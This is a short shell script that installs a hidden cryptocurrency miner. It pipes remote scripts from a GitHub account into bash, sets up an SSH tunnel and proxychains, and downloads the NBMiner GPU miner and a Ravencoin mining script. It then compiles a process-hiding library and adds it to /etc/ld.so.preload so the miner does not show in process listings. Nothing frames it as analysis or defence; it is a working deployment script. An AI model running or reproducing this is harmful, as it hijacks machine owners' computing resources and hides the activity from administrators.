#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
tar -xvzf NBMiner_37.1_Linux.tgz
cd NBMiner_Linux
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ravenminerWithProxy.sh
chmod +x ravenminerWithProxy.sh
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./ravenminerWithProxy.sh
